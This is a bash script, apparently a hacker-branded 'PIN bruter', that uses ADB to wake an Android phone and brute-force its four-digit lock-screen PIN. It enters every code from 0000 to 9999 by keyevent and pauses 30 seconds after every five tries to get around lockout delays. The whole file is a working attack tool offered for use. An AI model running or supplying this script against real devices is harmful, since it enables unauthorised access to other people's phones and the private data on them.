
#!/usr/bin/env bash


echo -e "\e[34m       _    _   _     ____ ___ _   _ ____  ____  _   _ _____ _____ ____   "
echo -e "\e[34m       / \  | \ | |   |  _ \_ _| \ | | __ )|  _ \| | | |_   _| ____|  _ \  "
echo -e "\e[34m      / _ \ |  \| |   | |_) | ||  \| |  _ \| |_) | | | | | | |  _| | |_) |  "
echo -e "\e[34m     / ___ \| |\  |   |  __/| || |\  | |_) |  _ <| |_| | | | | |___|  _ <    " 
echo -e "\e[34m    /_/   \_\_| \_|___|_|  |___|_| \_|____/|_| \_\\___/  |_| |_____|_| \_\   "
echo -e "\e[34m                 |_____|                                                    "
echo -e "                                                         -----AUTHER : \e[36m@MR_KALI_HACKER"


echo -e "\e[33m"
echo -e "\e[33m :::::::::::::::::::"
echo -e "\e[32m PIN BRUTER STARTED "
echo -e "\e[33m :::::::::::::::::::"
echo -e "\e[33m"

echo -e "\e[33m"
echo -e "\e[33m :::::::::::::::::::::::::::"
echo -e "\e[32m INSTA ID : @mr_kali_hacker"
echo -e "\e[33m :::::::::::::::::::::::::::"
echo -e "\e[33m"

adb shell input keyevent 82
adb shell input swipe 407 1211 378 85

echo -e "\e[33m"
echo -e "\e[33m ::::::::::::::::::::"
echo -e "\e[32m BRUTE FORCE STARTED"
echo -e "\e[33m ::::::::::::::::::::"
echo -e "\e[33m"

for i in {0000..9999}; do
    
    echo -e "\e[1m ::::::::::::::::::::::"
    echo -e "\e[1m BRUTEFORCING WITH  $i"
    echo -e "\e[1m ::::::::::::::::::::::"
	
    for (( j=0; j<${#i}; j++ )); do
        adb shell input keyevent $((`echo ${i:$j:1}`+7))
    done

    adb shell input keyevent 66
    
    if ! (( `expr $i + 1` % 5 )); then
        adb shell input keyevent 66
        echo -e "\e[33m"
        echo -e "\e[32mSLEEPING FOR 30 SEC"
        echo -e "\e[33m"
        sleep 30
        adb shell input keyevent 82
        adb shell input swipe 407 1211 378 85
    fi
done
